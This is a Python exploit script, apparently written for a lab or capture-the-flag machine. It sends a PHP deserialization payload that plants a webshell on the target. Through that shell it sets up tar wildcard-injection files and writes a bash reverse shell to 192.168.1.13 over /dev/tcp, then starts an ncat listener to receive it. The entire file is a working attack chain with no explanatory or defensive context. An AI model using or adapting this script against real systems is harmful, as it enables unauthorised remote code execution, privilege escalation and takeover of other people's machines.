import os
import urllib.parse
import requests


def web_exp():
    r = requests.post("http://192.168.1.20/index.php", data={
        "param": 'O:3:"Log":2:{s:8:"filename";s:32:"/var/www/html/scriptz/shell2.php";s:4:"data";s:54:"<?php echo "<p>"; system($_GET["ok"]); echo "<p\>"; ?>";}'})
    print(f"Write Webshell Successfully")
    r1 = requests.get("http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote(
        'touch "/home/rene/backup/--checkpoint-action=exec=sh shell2.sh"', "utf=8"))
    r2 = requests.get(
        "http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote('touch "/home/rene/backup/--checkpoint=1"',
                                                                          "utf=8"))
    r3 = requests.get("http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote(
        'echo "bash -c \'exec bash -i &>/dev/tcp/192.168.1.13/20000 <&1\'" > /home/rene/backup/shell2.sh', "utf=8"))
    r4 = requests.get(
        "http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote('chmod +x /home/rene/backup/shell2.sh',
                                                                          "utf=8"))
    print(f"Ready for Receiving Reverse Shell")


if __name__ == "__main__":
    web_exp()
    os.system("ncat -lvvp 20000")
